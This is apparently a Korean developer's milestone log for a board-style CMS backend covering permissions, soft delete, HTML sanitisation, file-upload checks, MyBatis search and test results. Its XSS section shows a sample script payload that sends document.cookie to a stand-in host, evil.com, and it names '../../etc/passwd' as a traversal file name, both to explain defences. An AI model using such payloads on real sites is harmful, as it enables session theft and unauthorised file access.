# M4. CMS 백엔드 (게시판·게시글·댓글·파일)

> 작성일: 2026-09-16 · 소요 시간: 약 2.5시간 · 관련 요구사항: PRD 9.3(FR-BOARD), 9.4(FR-POST), 9.5(FR-COMMENT), 9.6(FR-FILE)

## 1. 이번 단계의 목표

게시판 CMS의 서버 기능을 완성한다. 이 단계가 끝나면 다음이 가능해진다.

- 관리자가 게시판을 만들고 권한(누가 읽고 쓸 수 있는지)과 기능(댓글·첨부 허용)을 설정한다.
- 사용자가 글을 쓰고, 목록에서 검색하고, 상세를 본다. 공지는 항상 위에 뜬다.
- 댓글과 대댓글(1단계)을 단다.
- 이미지와 파일을 올려 글에 첨부한다. 위험한 파일은 서버가 거부한다.
- 본문에 스크립트를 넣어도 저장 전에 제거된다.

## 2. 배경 개념

### 2.1 soft delete (논리 삭제)
행을 실제로 지우지 않고 `deleted_at`에 시각을 적는 방식이다.

| | 물리 삭제 (DELETE) | 논리 삭제 (soft delete) |
|---|---|---|
| 복구 | 불가능 | `deleted_at`을 비우면 끝 |
| 참조 무결성 | 댓글이 참조 중이면 삭제 실패 | 문제없음 |
| 조회 | 그냥 SELECT | **항상 `WHERE deleted_at IS NULL`을 붙여야 한다** |

마지막 줄이 함정이다. 조건 하나를 빠뜨리면 삭제한 글이 목록에 나타난다. 그래서 이 프로젝트는 조회 경로를 Repository와 Mapper 두 곳으로만 제한하고, 그 안에서 조건을 강제한다.

게시판은 한 가지가 더 있다. `slug`에 유니크 제약이 있어서, 삭제한 게시판이 그대로 남아 있으면 같은 주소로 새 게시판을 못 만든다. 그래서 삭제할 때 slug를 `free__deleted__12`처럼 바꿔 자리를 비워준다.

### 2.2 권한 모델: 레벨 비교
게시판마다 "읽기 권한"과 "쓰기 권한"을 둔다. 값은 세 가지이고 순서가 있다.

```text
ANONYMOUS(0) < USER(1) < ADMIN(2)
사용자 레벨 >= 요구 레벨 이면 허용
```

```java
public enum Permission {
    ANONYMOUS(0), USER(1), ADMIN(2);

    public boolean allows(Role role) {
        return levelOf(role) >= this.level;   // role이 null이면 비로그인(0)
    }
}
```

if 문을 여기저기 흩어놓지 않고 enum 하나에 모으면, 규칙이 바뀔 때 고칠 곳이 한 군데다. 테스트도 조합표 하나로 끝난다.

### 2.3 XSS와 HTML 정제
**XSS(Cross-Site Scripting)**: 공격자가 글 본문에 스크립트를 심어두고, 그 글을 보는 사람의 브라우저에서 실행시키는 공격이다. 쿠키 탈취, 대리 요청 등 무엇이든 가능하다.

```html
<p>안녕하세요</p><script>fetch('http://evil.com?c='+document.cookie)</script>
```

막는 방법은 **화이트리스트 정제**다. 허용한 태그·속성만 남기고 나머지는 전부 지운다.

```java
private static final PolicyFactory POLICY = new HtmlPolicyBuilder()
        .allowElements("p", "br", "strong", "em", "ul", "li", "a", "img", ...)
        .allowAttributes("href").onElements("a")
        .allowUrlProtocols("http", "https")     // javascript: 차단
        .requireRelNofollowOnLinks()
        .toFactory();
```

블랙리스트(위험한 것만 지우기)는 쓰지 않는다. `<scr<script>ipt>` 같은 우회가 끝없이 나온다.

**중요**: 정제는 **저장 시점**에 한다. 화면에서만 처리하면 API를 직접 호출하는 경로가 뚫린다.

### 2.4 검색용 텍스트 컬럼
본문 HTML을 그대로 `LIKE` 검색하면 문제가 생긴다.

```sql
-- '강조'를 검색했는데 <strong> 태그 안의 글자가 아니라 태그 이름이 걸릴 수 있다
WHERE content LIKE '%strong%'   -- 모든 굵은 글씨 문서가 검색됨
```

그래서 태그를 제거한 순수 텍스트를 `content_text` 컬럼에 따로 저장하고, 내용 검색은 이 컬럼을 본다. 저장할 때 한 번 더 쓰는 대신 검색 품질을 얻는다.

### 2.5 파일 업로드 보안: 매직 넘버
확장자는 **파일 이름의 일부일 뿐**이다. 공격자는 `virus.exe`를 `photo.png`로 바꿔 올릴 수 있다.

진짜 형식은 파일 내용 앞부분의 **시그니처(매직 넘버)** 로 알 수 있다.

```text
PNG  : 89 50 4E 47 0D 0A 1A 0A   ("‰PNG....")
EXE  : 4D 5A                      ("MZ")
PDF  : 25 50 44 46                ("%PDF")
```

Apache Tika가 이걸 읽어준다. 확장자와 실제 형식이 다르면 거부한다.

```java
String detected = tika.detect(content);            // 내용으로 판별
if (!allowedTypes.contains(detected)) throw ...;   // 확장자와 대조
```

SVG는 이미지처럼 보이지만 안에 `<script>`를 넣을 수 있어 아예 허용하지 않는다.

또 하나: **저장 파일명은 UUID로 새로 만든다.** 사용자가 준 이름(`../../etc/passwd`)을 경로에 쓰면 저장소 밖으로 나갈 수 있기 때문이다. 원본 이름은 DB에만 둔다.

### 2.6 임시 파일과 정리
에디터에서 이미지를 붙여넣으면 **글을 저장하기 전에** 파일이 먼저 올라간다. 사용자가 글쓰기를 취소하면 그 파일은 주인 없이 남는다.

```text
업로드 → TEMP 상태 → 글에 연결되면 LINKED
                  └→ 24시간 지나도 TEMP면 스케줄러가 삭제
```

### 2.7 동시성: 조회수 올리기
두 사람이 동시에 글을 보면 이런 일이 생긴다.

```text
[위험]  A: 조회수 읽기(10) → B: 조회수 읽기(10) → A: 11 저장 → B: 11 저장  ❌ (12여야 함)
[안전]  UPDATE posts SET view_count = view_count + 1 WHERE id = ?          ✅ DB가 계산
```

읽어서 더하지 않고 DB에게 "1 더해라"라고 시킨다. 댓글 수도 같은 방식이다.

### 2.8 N+1 문제
목록 20개를 보여주는데 각 글의 작성자 닉네임을 따로 조회하면 쿼리가 21번 나간다(1 + 20). 이게 N+1이다.

MyBatis로 조인해서 한 번에 가져오면 쿼리 1번이다.

```sql
SELECT p.id, p.title, u.nickname AS author_nickname, ...
  FROM posts p JOIN users u ON u.id = p.author_id
```

첨부 여부도 `EXISTS` 서브쿼리로 같은 쿼리 안에서 처리했다.

## 3. 따라하기

### 3.1 도메인 4개 추가
M2에서 만든 구조(`domain / infra / application / api`)를 그대로 복사하듯 확장했다.

```text
domain/board/     Board, Permission, BoardRepository, BoardQueryMapper, BoardService,
                  BoardController, AdminBoardController
domain/post/      Post, PostStatus, PostRepository, PostQueryMapper, PostService, PostController
domain/comment/   Comment, CommentRepository, CommentQueryMapper, CommentService, CommentController
domain/file/      StoredFile, PostFile, FileValidator, FileService, FileController,
                  TempFileCleanupScheduler
```

### 3.2 JPA와 MyBatis 분담 (실제 적용)

| 기능 | 기술 | 이유 |
|---|---|---|
| 글 작성·수정·삭제 | JPA | 엔티티 메서드로 규칙을 표현하고 변경 감지로 저장 |
| 글 상세 조회 | JPA | 권한 확인과 수정에 엔티티가 필요 |
| 목록·검색·공지 | MyBatis | 동적 조건 + 조인 + 페이징을 SQL로 직접 제어 |
| 댓글 목록 | MyBatis | 작성자 조인 + 트리 정렬 |
| 조회수·댓글수 증감 | JPA `@Modifying` | `x = x + 1` 원자적 처리 |

### 3.3 동적 검색 SQL

```xml
<sql id="searchCondition">
  <if test="condition.keyword != null and condition.searchType != null">
    <choose>
      <when test="condition.searchType == 'title'">
        AND LOWER(p.title) LIKE LOWER(CONCAT('%', #{condition.keyword}, '%'))
      </when>
      <when test="condition.searchType == 'content'">
        AND LOWER(p.content_text) LIKE LOWER(CONCAT('%', #{condition.keyword}, '%'))
      </when>
      ...
    </choose>
  </if>
</sql>
```

- `#{}`만 쓴다. `${}`는 값을 SQL에 그대로 붙여 SQL Injection이 된다.
- `searchType`은 자바 쪽 record 생성자에서 화이트리스트로 걸러, 이상한 값이 오면 "검색 없음"으로 바꾼다.
- `LOWER(...) LIKE`는 두 DB에서 동일하게 대소문자를 무시한다.

### 3.4 공지 분리
공지는 페이지를 넘겨도 항상 위에 있어야 한다. 그래서 일반 목록 쿼리에서는 `is_notice = FALSE`로 빼고, 공지는 첫 페이지에서만 따로 조회해 붙인다.

```java
List<PostListItem> posts = postQueryMapper.selectPosts(condition);          // 공지 제외
List<PostListItem> notices = page == 0 ? postQueryMapper.selectNotices(boardId) : List.of();
return new PostListResult(notices, PageResponse.of(posts, page, size, total));
```

### 3.5 댓글 트리 만들기
DB에서 평평한 목록으로 가져와 서비스에서 1단계 트리로 조립한다.

```java
Map<Long, CommentNode> roots = new LinkedHashMap<>();
for (CommentItem item : items) {
    if (item.parentId() == null) roots.put(item.id(), toNode(item, ...));
    else roots.get(item.parentId()).replies().add(toNode(item, ...));
}
```

정렬이 핵심이다. `ORDER BY COALESCE(parent_id, id), id`로 정렬하면 부모 바로 뒤에 그 자식들이 온다. 부모를 먼저 만난 뒤 자식을 붙이므로 한 번의 순회로 끝난다.

삭제·숨김 댓글은 목록에서 빼지 않고 자리만 남긴다. 빼버리면 거기 달린 답글이 붕 뜨기 때문이다. 대신 내용과 작성자를 감춘다.

```java
String content = item.deleted() ? "삭제된 댓글입니다." : (item.hidden() ? "관리자에 의해 숨겨진 댓글입니다." : item.content());
```

## 4. 결정과 이유

| 결정 | 고려한 대안 | 선택 이유 |
|---|---|---|
| 게시글 삭제는 soft delete | 물리 삭제 | 실수 복구가 가능하고, 댓글·첨부와의 참조가 깨지지 않는다. |
| 게시판 삭제 시 slug 변경 | 그대로 두기 | 유니크 제약 때문에 같은 주소를 다시 쓸 수 없게 된다. |
| 게시글이 있으면 게시판 삭제 거부 | 연쇄 삭제 | 클릭 한 번으로 글 수천 개가 사라지는 사고를 막는다. 비활성화를 안내한다. |
| 숨김·삭제 글은 404 | 403 | 403은 "그 글이 있긴 하다"를 알려준다. 존재 자체를 숨기는 편이 안전하다. |
| 검색용 `content_text` 컬럼 분리 | 본문 HTML 직접 검색 | 태그 이름이 검색에 걸리는 문제를 없앤다. |
| 파일명은 UUID | 원본 파일명 사용 | 경로 조작(`../`)과 이름 충돌을 원천 차단한다. |
| SVG 업로드 금지 | 이미지니까 허용 | SVG는 스크립트를 담을 수 있는 XML 문서다. |
| 대댓글 1단계 제한 | 무한 깊이 | 깊이가 늘면 쿼리와 화면이 복잡해지고 실익이 적다. |
| 공개 읽기 API는 인증 없이 통과 | 전부 로그인 필수 | 공개 게시판을 비로그인도 봐야 한다. 실제 노출 범위는 게시판 권한이 정한다. |

## 5. 겪은 문제와 해결

### 문제 1: MyBatis XML을 못 찾는다
```text
org.apache.ibatis.binding.BindingException: Invalid bound statement (not found):
  ...BoardQueryMapper.selectReadableBoards
```
- **원인**: 설정이 `mapper-locations: classpath:mapper/**/*.xml`이었다. `classpath:`(별표 없음)는 클래스패스 **루트 하나**에서만 찾는다. 테스트 실행 시에는 `src/test/resources`가 먼저 잡혀서, 거기 있던 샘플 XML만 로드되고 `src/main/resources`의 XML들은 무시됐다.
- **해결**: `classpath*:mapper/**/*.xml`로 바꿨다. 별표가 붙으면 **모든** 클래스패스 루트를 훑는다.

```yaml
mybatis:
  mapper-locations: classpath*:mapper/**/*.xml
```
- **배운 점**: M1에서는 샘플 XML이 테스트 리소스에 있어 우연히 동작했다. 설정 오류가 나중에야 드러난 사례다.

### 문제 2: MySQL에서 본문 컬럼 타입 불일치
```text
Schema validation: wrong column type encountered in column [content] in table [posts];
found [longtext (Types#LONGVARCHAR)], but expecting [tinytext (Types#CLOB)]
```
- **원인**: 긴 텍스트를 `@JdbcTypeCode(SqlTypes.LONG32VARCHAR)`로 매핑했는데, MySQL 방언에서는 이게 CLOB으로 해석되고 길이 정보가 없어 `tinytext`를 기대했다. PostgreSQL에서는 통과했기 때문에 **MySQL에서만** 터졌다.
- **해결**: 애노테이션 대신 **길이를 크게** 줬다. Hibernate가 길이를 보고 DB별 긴 텍스트 타입을 고른다.

```java
@Column(nullable = false, length = Integer.MAX_VALUE)   // PostgreSQL: text, MySQL: longtext
private String content;
```
- **배운 점**: "두 DB에서 테스트한다"는 규칙이 값을 한 번 더 증명했다. 한쪽만 돌렸으면 운영 배포 후에 발견했을 문제다.

### 문제 3: ArchUnit 계층 규칙과 MyBatis 구조의 충돌
```text
Method <...BoardQueryMapper.selectAdminBoards()> has generic return type
  <List<...board.application.AdminBoardSummary>> ... (infra → application 의존)
```
- **원인**: MyBatis Mapper는 `infra`에 있는데, 조회 결과 DTO는 PRD 규칙(MB-03)대로 `application`에 뒀다. 그래서 `infra → application` 의존이 생겼고, "application은 api만 접근 가능"이라는 규칙에 걸렸다.
- **고민**: 두 가지 방법이 있었다.
  1. DTO를 `domain`으로 옮긴다 → 화면용 조회 모델이 도메인에 섞인다.
  2. 규칙에서 `infra → application`을 허용한다 → PRD 구조를 유지한다.
- **해결**: 2번을 택하고 **이유를 규칙 코드에 주석으로 남겼다**. 다른 도메인 침범은 ARCH-04가 따로 막고 있어 위험이 없다.

```java
.whereLayer("application")
// infra(MyBatis Mapper)는 application의 조회 전용 DTO를 반환한다(PRD MB-03).
.mayOnlyBeAccessedByLayers("api", "infra")
```

### 문제 4: 공개 게시판인데 비로그인 조회가 401
- **원인**: M2에서 `/api/v1/**`를 전부 인증 필요로 막아뒀다. 그때는 인증 API밖에 없어서 문제가 없었지만, 이제 공개 게시판 조회가 막혔다.
- **해결**: 읽기(GET) 경로만 인증 없이 통과시키고, 실제 노출 범위는 게시판 권한이 판단하게 했다.

```java
.requestMatchers(HttpMethod.GET, "/api/v1/boards/**", "/api/v1/posts/**", "/api/v1/files/**")
.permitAll()
```
읽기 권한이 USER인 게시판은 서비스에서 403을 던지므로 보안은 유지된다.

### 문제 5: 테스트끼리 데이터가 섞인다
```text
expected: 2L but was: 18L   (기본 게시판이 2개여야 하는데 18개)
```
- **원인**: Testcontainers 컨테이너를 JVM당 하나만 띄워 재사용한다(빠르니까). CMS 테스트가 만든 게시판이 그대로 남아, M1의 "시드 게시판 2개" 검증이 깨졌다.
- **해결**: 시드 검증을 "2개 이상"으로 바꿨다. 각 테스트는 **자기가 만든 데이터만** 확인하도록 고유한 slug(`board-{임의값}`)와 이메일을 쓴다.
- **대안 검토**: 테스트마다 트랜잭션 롤백이나 DB 초기화를 넣을 수도 있지만, 속도가 크게 느려지고 별도 트랜잭션(REQUIRES_NEW) 로직과 충돌한다. 지금 규모에서는 고유 값 전략이 낫다고 판단했다.

## 6. 확인 방법

```bash
cd backend
./gradlew test -PdbVendor=postgresql
./gradlew test -PdbVendor=mysql
```

두 DB 모두 65개 테스트가 통과한다(M1 11 + M2 15 + M4 39).

```text
게시판 권한 > 사용자 단계가 요구 단계 이상이면 허용한다 (9개 조합) PASSED
HTML 정제 > script 태그를 제거한다 PASSED
HTML 정제 > 이벤트 핸들러 속성을 제거한다 PASSED
HTML 정제 > javascript: 링크를 제거한다 PASSED
파일 검증 > 실행 파일을 png로 위장하면 거부한다 PASSED
CMS API > 관리자가 게시판을 만들면 사용자 목록에 나타난다 PASSED
CMS API > 읽기 권한이 USER인 게시판은 비로그인 사용자에게 보이지 않는다 PASSED
CMS API > 쓰기 권한이 ADMIN인 게시판에는 일반 사용자가 글을 쓸 수 없다 PASSED
CMS API > 게시글이 있는 게시판은 삭제할 수 없다 PASSED
CMS API > 제목과 내용으로 검색한다 PASSED
CMS API > 공지는 목록 상단에 따로 반환되고 일반 목록에는 포함되지 않는다 PASSED
CMS API > 남의 글은 수정하거나 삭제할 수 없고, 관리자는 할 수 있다 PASSED
CMS API > 댓글과 대댓글을 달고 목록에서 트리로 받는다 PASSED
CMS API > 대댓글에는 답글을 달 수 없다 PASSED
CMS API > 삭제된 댓글은 자리만 남고 내용이 감춰진다 PASSED
CMS API > 이미지를 올려 글에 첨부하면 상세에서 확인할 수 있다 PASSED
CMS API > 확장자를 위장한 파일은 업로드를 거부한다 PASSED
CMS API > 남이 올린 임시 파일은 다운로드할 수 없다 PASSED

BUILD SUCCESSFUL
```

Swagger UI(http://localhost:8080/swagger-ui.html)에서 직접 확인하려면:

1. `POST /api/v1/auth/login`으로 관리자 로그인 → Authorize에 토큰 입력
2. `POST /api/v1/admin/boards`로 게시판 생성 (slug: `free`, 읽기 ANONYMOUS, 쓰기 USER)
3. `POST /api/v1/files`로 이미지 업로드 → 받은 id 확인
4. `POST /api/v1/boards/free/posts`에 `fileIds: [id]`를 넣어 글 작성
5. `GET /api/v1/boards/free/posts?searchType=title&keyword=...`로 검색
6. `POST /api/v1/posts/{id}/comments`로 댓글, `parentId`를 넣어 대댓글

## 7. 회고와 다음 단계

**잘된 점**
- 보안 관련 기능(HTML 정제, 파일 위장 검사, 권한 조합)을 모두 테스트로 고정했다. 나중에 코드를 고쳐도 이 방어선은 무너지지 않는다.
- M2에서 만든 구조를 그대로 복사해 도메인 4개를 빠르게 추가할 수 있었다. "새 도메인 추가 절차"가 실제로 동작한다는 뜻이다.
- MySQL 전용 문제(본문 타입)를 배포 전에 잡았다.

**아쉬운 점 / 개선할 점**
- 검색이 `LIKE '%키워드%'`라 데이터가 많아지면 느려진다. 인덱스를 타지 못하는 형태다. PRD대로 전문 검색은 향후 확장으로 남겼다.
- 목록 조회 성능을 실제 데이터 1만 건으로 측정해보지 못했다. M7에서 측정한다.
- 관리자 기능 중 게시판 관리만 만들었다. 게시글·댓글·사용자 관리는 M6이다.

**다음 단계 (M5)**
- 게시판 목록, 글 목록·상세·작성 화면
- TipTap 에디터와 이미지 즉시 업로드
- 댓글 UI
